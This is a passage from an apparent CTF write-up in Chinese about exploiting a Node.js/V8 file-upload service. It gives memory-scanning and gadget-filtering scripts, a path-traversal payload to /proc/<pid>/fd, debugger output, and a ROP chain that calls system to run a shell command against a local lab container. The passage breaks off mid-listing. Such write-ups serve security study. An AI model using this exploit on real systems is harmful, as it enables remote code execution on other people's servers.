class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">dump memory mem1 0x400000 0xe0a000</span></span><br><span class="line"><span class="string">dump memory mem2 0xe0a000 0xe0d000</span></span><br><span class="line"><span class="string">dump memory mem3 0xe0e000 0x3005000</span></span><br><span class="line"><span class="string">dump memory mem4 0x3200000 0x3201000</span></span><br><span class="line"><span class="string">dump memory mem5 0x3201000 0x64a3000</span></span><br><span class="line"><span class="string">dump memory mem6 0x64a3000 0x64a7000</span></span><br><span class="line"><span class="string">dump memory mem7 0x64a7000 0x64d1000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_mem</span>(<span class="params">addr, size</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x400000</span> &lt; addr &lt; <span class="number">0xe0a000</span>:</span><br><span class="line">        base = <span class="number">0x400000</span></span><br><span class="line">        data = mem1[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0xe0a000</span> &lt; addr &lt; <span class="number">0xe0d000</span>:</span><br><span class="line">        base = <span class="number">0xe0a000</span></span><br><span class="line">        data = mem2[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0xe0e000</span> &lt; addr &lt; <span class="number">0x3005000</span>:</span><br><span class="line">        base = <span class="number">0xe0e000</span></span><br><span class="line">        data = mem3[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x3200000</span> &lt; addr &lt; <span class="number">0x3201000</span>:</span><br><span class="line">        base = <span class="number">0x3200000</span></span><br><span class="line">        data = mem4[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x3201000</span> &lt; addr &lt; <span class="number">0x64a3000</span>:</span><br><span class="line">        base = <span class="number">0x3201000</span></span><br><span class="line">        data = mem5[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x64a3000</span> &lt; addr &lt; <span class="number">0x64a7000</span>:</span><br><span class="line">        base = <span class="number">0x64a3000</span></span><br><span class="line">        data = mem6[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x64a7000</span> &lt; addr &lt; <span class="number">0x64d1000</span>:</span><br><span class="line">        base = <span class="number">0x64a7000</span></span><br><span class="line">        data = mem7[addr - base: addr + size - base]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_useful_gadget</span>(<span class="params">out</span>):</span><br><span class="line">    dis_list = out.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(dis_list):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;ret&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;bad&#x27;</span> <span class="keyword">in</span> dis_list[_]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取内存文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem1&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem3 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem4&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem4 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem5&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem5 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem6&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem6 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem7&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem7 = f.read()</span><br><span class="line"></span><br><span class="line">segments = [</span><br><span class="line">    (<span class="number">0x400000</span>, <span class="number">0xe0a000</span> - <span class="number">0x400000</span>),</span><br><span class="line">    (<span class="number">0xe0a000</span>, <span class="number">0xe0d000</span> - <span class="number">0xe0a000</span>),</span><br><span class="line">    (<span class="number">0xe0e000</span>, <span class="number">0x3005000</span> - <span class="number">0xe0e000</span>),</span><br><span class="line">    (<span class="number">0x3200000</span>, <span class="number">0x3201000</span> - <span class="number">0x3200000</span>),</span><br><span class="line">    (<span class="number">0x3201000</span>, <span class="number">0x64a3000</span> - <span class="number">0x3201000</span>),</span><br><span class="line">    (<span class="number">0x64a3000</span>, <span class="number">0x64a7000</span> - <span class="number">0x64a3000</span>),</span><br><span class="line">    (<span class="number">0x64a7000</span>, <span class="number">0x64d1000</span> - <span class="number">0x64a7000</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> addr, length <span class="keyword">in</span> segments:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">4</span>):</span><br><span class="line">            handle = addr + offset</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(p64(handle - <span class="number">0x60</span>)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            signum = read_mem(handle + <span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(signum):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ptr = read_mem(handle, <span class="number">8</span>)</span><br><span class="line">            data = read_mem(u64(ptr), <span class="number">30</span>)</span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            out = disasm(data, arch=<span class="string">&#x27;amd64&#x27;</span>, byte=<span class="literal">False</span>, offset=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> is_useful_gadget(out):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;pop    rbp&quot;</span> <span class="keyword">in</span> out <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> out:</span><br><span class="line">                    output_file.write(<span class="string">f&#x27;handle <span class="subst">&#123;<span class="built_in">hex</span>(handle)&#125;</span> -&gt; ptr: <span class="subst">&#123;u64(ptr)&#125;</span> signum <span class="subst">&#123;<span class="built_in">hex</span>(u32(signum))&#125;</span>\n&#x27;</span>)</span><br><span class="line">                    output_file.write(out + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最终找到一条合格的<code>gadget</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">handle <span class="number">0x3b49a48</span> -&gt; ptr: <span class="number">27902480</span> signum <span class="number">0x1a9c210</span></span><br><span class="line">mov    edx, esi</span><br><span class="line">mov    rdi, r12</span><br><span class="line">mov    esi, <span class="number">0x3b498f7</span></span><br><span class="line">call   <span class="number">0xffffffffffffff20</span></span><br><span class="line">add    rsp, <span class="number">0x70</span></span><br><span class="line">xor    eax, eax</span><br><span class="line">pop    rbx</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">pop    r14</span><br><span class="line">pop    rbp</span><br><span class="line">ret  </span><br></pre></td></tr></table></figure>

<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><code>poc</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">content = p64(<span class="number">0x3b49a48</span> - <span class="number">0x60</span>) + p64(<span class="number">0x1a9c210</span>) + <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">a = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">data = &#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;../../../../proc/98/fd/11&quot;</span>,<span class="string">&quot;content&quot;</span>:content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(json.dumps(data))</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;http://172.17.0.2:3000/upload&quot;</span>,data = json.dumps(data),headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>在<code>11</code>通道读取<code>0x200</code>个字符</p>
<p><img src="/images/image-1740300420970.png" alt="img"></p>
<p>可以看到可以控制<code>rbx</code>，<code>r12</code>，<code>r13</code>，<code>r14</code>，<code>rbp</code>，<code>rip</code>寄存器</p>
<p><img src="/images/image-1740300423356.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r</span><br><span class="line">rax            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">rbx            <span class="number">0x616161616161616c</span>  <span class="number">7016996765293437292</span></span><br><span class="line">rcx            <span class="number">0x1a9c210</span>           <span class="number">27902480</span></span><br><span class="line">rdx            <span class="number">0x3b498f7</span>           <span class="number">62167287</span></span><br><span class="line">rsi            <span class="number">0x1a9c1e0</span>           <span class="number">27902432</span></span><br><span class="line">rdi            <span class="number">0x3b499e8</span>           <span class="number">62167528</span></span><br><span class="line">rbp            <span class="number">0x6161616161616170</span>  <span class="number">0x6161616161616170</span></span><br><span class="line">rsp            <span class="number">0x7f310e19bdd0</span>      <span class="number">0x7f310e19bdd0</span></span><br><span class="line">r8             <span class="number">0x3b498f7</span>           <span class="number">62167287</span></span><br><span class="line">r9             <span class="number">0x6356</span>              <span class="number">25430</span></span><br><span class="line">r10            <span class="number">0x7ffc91646090</span>      <span class="number">140722747760784</span></span><br><span class="line">r11            <span class="number">0x246</span>               <span class="number">582</span></span><br><span class="line">r12            <span class="number">0x616161616161616d</span>  <span class="number">7016996765293437293</span></span><br><span class="line">r13            <span class="number">0x616161616161616e</span>  <span class="number">7016996765293437294</span></span><br><span class="line">r14            <span class="number">0x616161616161616f</span>  <span class="number">7016996765293437295</span></span><br><span class="line">r15            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">rip            <span class="number">0x1a9c22d</span>           <span class="number">0x1a9c22d</span> &lt;v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::FullValidationTag, v8::internal::wasm::ConstantExpressionInterface, (v8::internal::wasm::DecodingMode)<span class="number">1</span>&gt;::DecodeStringRefOpcode(v8::internal::wasm::WasmOpcode, unsigned <span class="built_in">int</span>)+<span class="number">221</span>&gt;</span><br><span class="line">eflags         <span class="number">0x246</span>               [ PF ZF IF ]</span><br><span class="line">cs             <span class="number">0x33</span>                <span class="number">51</span></span><br><span class="line">ss             <span class="number">0x2b</span>                <span class="number">43</span></span><br><span class="line">ds             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">es             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">fs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">gs             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">k0             <span class="number">0x21008000</span>          <span class="number">553680896</span></span><br><span class="line">k1             <span class="number">0xff7ffbff</span>          <span class="number">4286577663</span></span><br><span class="line">k2             <span class="number">0xff7ffbff</span>          <span class="number">4286577663</span></span><br><span class="line">k3             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">k4             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">k5             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">k6             <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line">k7             <span class="number">0x0</span>                 <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><p>由于程序本身没有 <code>system</code> 、 <code>popen</code> 等函数的调用 ，所以不可以直接 <code>ret2text</code>， 思路简单定成如下：</p>
<ul>
<li>找到一个 <code>gadget</code> 能将<code>cmd</code>写到<code>bss</code>段中</li>
<li>找到一个 <code>gadget</code> 能从任意地址读取值， 然后赋值到某个寄存器上</li>
<li>找到一个<code>gadget</code> 能对可控的寄存器进行加减法运算</li>
<li>找到一个 <code>libc</code> 函数， 该函数与 <code>system</code> 的偏移满足 <code>UTF-8</code> 编码</li>
</ul>
<p>首先利用python脚本筛选出所有gadget地址满足utf-8的gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary node &gt; gadgets</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">lines = [line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;./gadgets&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> line: <span class="string">&#x27; : &#x27;</span> <span class="keyword">in</span> line, lines))</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> line: line.split(<span class="string">&#x27; : &#x27;</span>), lines))</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> l: is_valid_utf8(p64(<span class="built_in">int</span>(l[<span class="number">0</span>], <span class="number">16</span>))), lines))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出保存到文件 output.txt 中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;i[<span class="number">0</span>]&#125;</span> : <span class="subst">&#123;i[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>思路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000002780d6d</span> : pop rax ; sal edx, <span class="number">0xf</span> ; pop rcx ; ret</span><br><span class="line"><span class="number">0x0000000001526e68</span> : mov qword ptr [rax], rcx ; pop rbx ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0x00000000029088e6</span> : pop rdi ; adc al, <span class="number">0xe8</span> ; ret</span><br><span class="line"><span class="number">0x00000000011b6524</span> : mov rax, qword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x00000000016e1c42</span> : add rax, rcx ; ret</span><br><span class="line"><span class="number">0x0000000002237647</span> : mov edx, <span class="number">1</span> ; jmp rax</span><br><span class="line">.got:00000000064A6048 __assert_fail_ptr dq offset __assert_fail</span><br><span class="line">system_addr - __assert_fail_addr = <span class="number">0x17620</span></span><br><span class="line"></span><br><span class="line">pop_rax_rcx_ret = <span class="number">0x0000000002780d6d</span></span><br><span class="line">mov_rax_rcx_pop_rbx_r12_rbp_ret = <span class="number">0x0000000001526e68</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000029088e6</span></span><br><span class="line">mov_rax_rax_ret = <span class="number">0x00000000011b6524</span></span><br><span class="line">add_rax_rcx_ret = <span class="number">0x00000000016e1c42</span></span><br><span class="line">jmp_rax = <span class="number">0x0000000002237647</span></span><br><span class="line">__assert_fail_got = <span class="number">0x00000000064A6048</span></span><br><span class="line">bss_addr = <span class="number">0x00000000064D1060</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x3b49a48</span> - <span class="number">0x60</span>) + p64(<span class="number">0x1a9c210</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(cmd)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(rbx) + p64(r12) + p64(rbp)</span><br><span class="line">        ...                ...</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(cmd)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(rbx) + p64(r12) + p64(rbp)</span><br><span class="line">content += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(__assert_fail_got) + p64(<span class="number">0x17620</span>)</span><br><span class="line">content += p64(mov_rax_rax_ret)</span><br><span class="line">content += p64(add_rax_rcx_ret)</span><br><span class="line">content += p64(jmp_rax)</span><br></pre></td></tr></table></figure>

<p>测试<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">pop_rax_rcx_ret = <span class="number">0x0000000002780d6d</span></span><br><span class="line">mov_rax_rcx_pop_rbx_r12_rbp_ret = <span class="number">0x0000000001526e68</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000029088e6</span></span><br><span class="line">mov_rax_rax_ret = <span class="number">0x00000000011b6524</span></span><br><span class="line">add_rax_rcx_ret = <span class="number">0x00000000016e1c42</span></span><br><span class="line">jmp_rax = <span class="number">0x0000000002237647</span></span><br><span class="line">__assert_fail_got = <span class="number">0x00000000064A6048</span></span><br><span class="line">bss_addr = <span class="number">0x00000000064D1060</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x3b49a48</span> - <span class="number">0x60</span>) + p64(<span class="number">0x1a9c210</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(<span class="number">0x742F206863756F74</span>)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x3B67616C662F706D</span>)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">content += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(__assert_fail_got) + p64(<span class="number">0x17620</span>)</span><br><span class="line">content += p64(mov_rax_rax_ret)</span><br><span class="line">content += p64(add_rax_rcx_ret)</span><br><span class="line">content += p64(jmp_rax)</span><br><span class="line"></span><br><span class="line">a = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">data = &#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;../../../../proc/82/fd/11&quot;</span>,<span class="string">&quot;content&quot;</span>:content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(json.dumps(data))</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;http://172.17.0.2:3000/upload&quot;</span>,data = json.dumps(data),headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>可以看到已经将rdi指向了<code>cmd</code>地址，跳转到<code>system</code>函数</p>
<p><img src="/images/image-1740300429890.png" alt="img"></p>
<p>但在<code>system</code>函数中，发生了崩溃，崩溃原因：<strong>内存对齐问题</strong>：<code>movaps</code> 要求目标内存地址必须是 <code>16 </code>字节对齐的。如果 <code>[rsp + 0x50]</code> 的地址（即 <code>0x7f0243579b38</code>）不是 <code>16 </code>字节对齐，那么执行 <code>movaps</code> 就会导致崩溃。</p>
<p><img src="/images/image-1740300432287.png" alt="img"></p>
<p>解决栈对齐问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000002780d6d</span> : pop rax ; sal edx, <span class="number">0xf</span> ; pop rcx ; ret</span><br><span class="line"><span class="number">0x0000000001526e68</span> : mov qword ptr [rax], rcx ; pop rbx ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0x00000000029088e6</span> : pop rdi ; adc al, <span class="number">0xe8</span> ; ret</span><br><span class="line"><span class="number">0x00000000011b6524</span> : mov rax, qword ptr [rax] ; ret</span><br><span class="line"><span class="number">0x00000000016e1c42</span> : add rax, rcx ; ret</span><br><span class="line"><span class="number">0x0000000002564072</span> : xor r14b, r14b ; ret</span><br><span class="line"><span class="number">0x0000000002237647</span> : mov edx, <span class="number">1</span> ; jmp 